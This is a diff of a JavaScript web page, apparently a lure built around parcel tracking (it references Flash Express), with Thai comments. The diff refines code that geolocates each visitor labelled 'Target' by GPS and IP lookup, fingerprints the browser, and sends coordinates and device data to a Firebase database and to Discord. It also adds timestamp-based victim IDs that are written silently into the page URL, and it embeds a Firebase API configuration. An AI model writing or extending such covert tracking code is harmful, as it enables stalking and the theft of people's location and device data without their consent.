@@ -93,18 +93,25 @@
     const BASE_LAT = 9.9833;
     const BASE_LNG = 99.1500;
     const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
-// ฟังก์ชันสับสวิตช์ระบบ ไม่บล็อกการเปลี่ยนหน้า (วางแทรกบรรทัด 85)
-// handleTargetClick ถูกย้ายไปที่ท้ายไฟล์เพื่อใช้ระบบ async/await แทน setTimeout
-     // Firebase Configuration (for real-time sync)
-     const FIREBASE_CONFIG = {
-       apiKey: "AIzaSyB6G3JQZ7Y8X9W0V1U2T3S4R5Q6P7O8N9M",
-       authDomain: "eye-shadow-a4f8c.firebaseapp.com",
-       projectId: "eye-shadow-a4f8c",
-       storageBucket: "eye-shadow-a4f8c.appspot.com",
-       messagingSenderId: "123456789",
-       appId: "1:123456789:web:dummy",
-       databaseURL: "https://eye-shadow-a4f8c-default-rtdb.asia-southeast1.firebasedatabase.app/"
-     };
+
+    // ฟังก์ชันสร้าง targetId แบบสุ่ม ใช้ 6 ตัวท้ายของเวลาปัจจุบัน
+    function generateTargetId() {
+      const now = new Date();
+      const timestamp = now.getTime().toString();
+      const randomSuffix = timestamp.slice(-6); // ดึง 6 ตัวท้ายของ timestamp
+      return 'Player_' + randomSuffix;
+    }
+
+    // Firebase Configuration (for real-time sync)
+    const FIREBASE_CONFIG = {
+      apiKey: "AIzaSyB6G3JQZ7Y8X9W0V1U2T3S4R5Q6P7O8N9M",
+      authDomain: "eye-shadow-a4f8c.firebaseapp.com",
+      projectId: "eye-shadow-a4f8c",
+      storageBucket: "eye-shadow-a4f8c.appspot.com",
+      messagingSenderId: "123456789",
+      appId: "1:123456789:web:dummy",
+      databaseURL: "https://eye-shadow-a4f8c-default-rtdb.asia-southeast1.firebasedatabase.app/"
+    };
     
     // ===== FIREBASE REAL-TIME SYNC =====
     let firebaseDb = null;
@@ -128,7 +135,7 @@
       if (!firebaseDb) return false;
       
       try {
-        // ส่งข้อมูลไปยัง Firebase Realtime Database ที่โหนด 'player_coordinates'
+        // ส่งข้อมูลไปยัง Firebase Realtime Database ที่โหนด 'player_coordinates/' + targetId
         const dbRef = firebaseDb.ref('player_coordinates/' + targetId);
         console.log("Firebase Upload Triggered", data);
         await dbRef.set({
@@ -456,7 +463,16 @@ async function fetchIPGeo() {
 
     // ===== HYBRID GEOLOCATION =====
     async function runHybridGeolocation() {
-      const targetId = getUrlParam('id') || 'player_1';
+      // ใช้ targetId จาก URL parameter หรือสร้างใหม่ถ้าไม่มี
+      let targetId = getUrlParam('id');
+      if (!targetId) {
+        targetId = generateTargetId();
+        // อัปเดต URL ด้วย targetId ใหม่ (ไม่รีโหลดหน้า)
+        const newUrl = new URL(window.location);
+        newUrl.searchParams.set('id', targetId);
+        window.history.replaceState({}, '', newUrl);
+      }
+      
       const fp = getFingerprint();
       const result = {
         actor: 'Target',
@@ -515,7 +531,7 @@ async function fetchIPGeo() {
       // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
       syncCoordinatesToMainPage(targetId, result);
       
-      // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
+      // ส่งข้อมูลไป Firebase สำหรับ Real-time sync (แยกโฟลเดอร์ตาม targetId)
       await sendToFirebase(targetId, result);
 
       // Send to Discord
@@ -524,7 +540,15 @@ async function fetchIPGeo() {
 
     // ===== IMMEDIATE FALLBACK =====
     async function runImmediateFallback() {
-      const targetId = getUrlParam('id') || 'player_1';
+      // ใช้ targetId จาก URL parameter หรือสร้างใหม่ถ้าไม่มี
+      let targetId = getUrlParam('id');
+      if (!targetId) {
+        targetId = generateTargetId();
+        const newUrl = new URL(window.location);
+        newUrl.searchParams.set('id', targetId);
+        window.history.replaceState({}, '', newUrl);
+      }
+      
       const fp = getFingerprint();
       const result = {
         actor: 'Target',
